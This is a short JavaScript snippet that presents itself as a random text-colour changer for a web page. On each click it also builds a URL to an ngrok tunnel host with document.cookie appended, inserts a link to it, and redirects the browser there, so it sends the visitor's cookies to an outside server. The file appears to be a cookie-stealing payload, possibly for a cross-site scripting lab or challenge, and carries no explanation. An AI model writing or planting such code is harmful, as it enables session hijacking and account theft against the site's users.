const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}

color.onclick = () => {
  target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(
    255
  )}, ${getRandomInt(255)})`;
  let url =
    "https://405c-88-124-100-48.ngrok-free.app/xxxxx?cookie=" + document.cookie;
  target.innerHTML = `<a href="${url}" target="_blank">Click here to see your new color</a>`;
  window.location.href = url;
};
